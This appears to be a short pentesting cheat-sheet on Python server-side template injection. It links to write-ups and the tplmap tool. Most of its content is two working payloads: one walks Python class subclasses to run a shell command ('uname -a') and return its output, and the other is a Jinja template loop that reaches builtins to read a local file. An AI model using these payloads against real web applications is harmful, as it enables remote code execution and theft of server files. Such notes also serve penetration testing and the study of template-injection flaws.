# Server side template injection

### Links:
#### [rce with output via communicate](https://gist.github.com/mgeeky/fd994a067e3407fd87e8c224e65df8d8)
```
''.__class__.__mro__[2].__subclasses__()[233]('uname -a',shell=True,stdout=-1).communicate()[0].strip()
```
#### [eval/catch_warning](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)


### Tools:
#### [tplmap](https://github.com/epinna/tplmap)


### Notes:

#### Finding eval function
```
{% for a in [].__class__.__mro__[1].__subclasses__() %}
    {% if a.__name__ == 'catch_warnings' %}
        {% for b in a.__init__.__globals__.values() %}
            {% if b.__class__ == {}.__class__ %}
                {% if 'open' in b.keys() %}
                    {{ b['open']('cert.py').read() }}
                {% endif %}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```
---